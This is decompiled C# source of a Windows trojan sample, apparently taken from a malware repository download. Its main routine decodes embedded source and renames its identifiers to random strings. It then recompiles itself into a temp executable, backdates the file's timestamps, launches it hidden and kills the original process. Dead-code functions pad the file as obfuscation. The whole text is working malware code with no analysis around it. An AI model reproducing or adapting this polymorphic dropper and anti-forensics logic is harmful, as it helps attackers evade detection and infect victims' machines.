// Decompiled with JetBrains decompiler
// Type: rHjFMfCdNe
// Assembly: tmp2E40.tmp, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8EEE8E37-EB17-405E-9B11-34066CAFB67D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.Win32.Generic-76851a57710cb206de65e017f3e988a3d2970667a297a6b3068a22fc12b9dc81.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;

[StandardModule]
public sealed class rHjFMfCdNe
{
  public static void nXlaulANzi()
  {
    rHjFMfCdNe.DelMe();
    string fileName = Process.GetCurrentProcess().MainModule.FileName;
    ResourceManager resourceManager = new ResourceManager("zCom", Assembly.GetExecutingAssembly());
    string Str = rHjFMfCdNe.FromBase(Conversions.ToString(resourceManager.GetObject("src")));
    JeyzHKqayP.Deflate_D((byte[]) resourceManager.GetObject("file"));
    using (ResourceWriter resourceWriter = new ResourceWriter("zCom.resources"))
    {
      resourceWriter.AddResource("src", rHjFMfCdNe.ToBase(Str));
      resourceWriter.AddResource("file", RuntimeHelpers.GetObjectValue(resourceManager.GetObject("file")));
      resourceWriter.Generate();
      resourceWriter.Close();
    }
    string str1 = Path.GetTempFileName() + ".exe";
    string[] strArray = new string[9]
    {
      nameof (rHjFMfCdNe),
      "RjfimvXhGX",
      "JeyzHKqayP",
      "NjStNGzRRE",
      "IkakVponEY",
      "vCarFcbLxm",
      "FBlUzyIreT",
      "mKRIuILDtw",
      nameof (nXlaulANzi)
    };
    int num = checked (strArray.Length - 1);
    int index = 0;
    while (index <= num)
    {
      Str = Str.Replace(strArray[index], rHjFMfCdNe.A(15));
      checked { ++index; }
    }
    Random random = new Random();
    int Kolikox = random.Next(1, 1);
    NjStNGzRRE njStNgzRre1 = new NjStNGzRRE(1, Kolikox);
    VBMath.Randomize();
    string str2 = Str.Replace(Strings.StrReverse("1IPA'"), njStNgzRre1.IkakVponEY());
    NjStNGzRRE njStNgzRre2 = new NjStNGzRRE(1, Kolikox);
    VBMath.Randomize();
    string str3 = str2.Replace(Strings.StrReverse("2IPA'"), njStNgzRre2.IkakVponEY());
    NjStNGzRRE njStNgzRre3 = new NjStNGzRRE(1, Kolikox);
    VBMath.Randomize();
    string str4 = str3.Replace(Strings.StrReverse("3IPA'"), njStNgzRre3.IkakVponEY());
    VBMath.Randomize();
    string Source = str4.Replace(Strings.StrReverse("#001#"), Conversions.ToString(Kolikox));
    RjfimvXhGX.mKRIuILDtw(str1, Source, true);
    rHjFMfCdNe.DelMe();
    DateTime dateTime = new DateTime(checked (2000 + random.Next(7, 11)), random.Next(1, 10), random.Next(1, 30));
    File.SetCreationTime(str1, dateTime);
    File.SetLastAccessTime(str1, dateTime);
    File.SetLastWriteTime(str1, dateTime);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      FileName = str1,
      Arguments = fileName
    });
    Process.GetCurrentProcess().Kill();
  }

  public static string xtqHp00(string qKtgB0, string BSvNx0, string ICRXU0)
  {
    string[] strArray1 = new string[5]
    {
      "xtqHp0",
      nameof (qKtgB0),
      nameof (BSvNx0),
      nameof (ICRXU0),
      "AaNCH0"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], qKtgB0, false) != 0)
    {
      BSvNx0 = ICRXU0 + qKtgB0;
      if (ICRXU0.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (ICRXU0.Length - 1));
        while (BSvNx0.Length == 2)
        {
          if (qKtgB0.Contains(strArray1[1]))
            return qKtgB0;
        }
      }
    }
    return qKtgB0;
  }

  public static string EbAFw11(string vnOLF1, string jUNlD1, string Ucwaa1)
  {
    string[] strArray1 = new string[5]
    {
      "EbAFw1",
      nameof (vnOLF1),
      nameof (jUNlD1),
      nameof (Ucwaa1),
      "pgMLM1"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], vnOLF1, false) != 0)
    {
      jUNlD1 = Ucwaa1 + vnOLF1;
      if (Ucwaa1.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (Ucwaa1.Length - 1));
        while (jUNlD1.Length == 2)
        {
          if (vnOLF1.Contains(strArray1[1]))
            return vnOLF1;
        }
      }
    }
    return vnOLF1;
  }

  public static string A(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }

  public static string AB(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "1234567890".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }

  public static string ToBase(string Str) => Convert.ToBase64String(Encoding.Default.GetBytes(Str));

  public static string FromBase(string Str) => Encoding.Default.GetString(Convert.FromBase64String(Str));

  public static void DelMe()
  {
    try
    {
      File.Delete("zCom.resources");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
